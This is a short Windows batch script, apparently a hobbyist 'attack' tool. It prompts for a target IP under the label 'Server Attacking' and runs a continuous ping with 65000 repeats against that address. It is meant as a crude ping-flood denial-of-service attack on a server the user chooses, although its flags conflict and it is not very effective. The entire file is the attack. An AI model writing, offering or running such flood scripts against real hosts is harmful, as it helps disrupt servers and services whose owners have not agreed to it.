@echo off
color c

set /p imput=Server Attacking (IP): 
ping -t -a -n 65000 %imput%